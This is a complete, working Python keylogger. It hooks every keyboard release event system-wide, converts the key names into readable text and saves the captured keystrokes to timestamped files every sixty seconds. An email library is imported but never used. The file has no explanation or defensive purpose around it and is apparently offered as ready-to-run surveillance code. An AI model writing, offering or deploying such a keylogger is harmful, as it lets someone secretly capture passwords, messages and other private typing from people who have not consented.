import keyboard
import threading
import smtplib
from datetime import datetime

class Keylogger:
    def __init__(self, interval=60, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_file(self):
        with open(f"keylog_{self.start_dt.strftime('%Y%m%d_%H%M%S')}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved keylog to file")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            if self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = threading.Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=60, report_method="file")
    keylogger.start()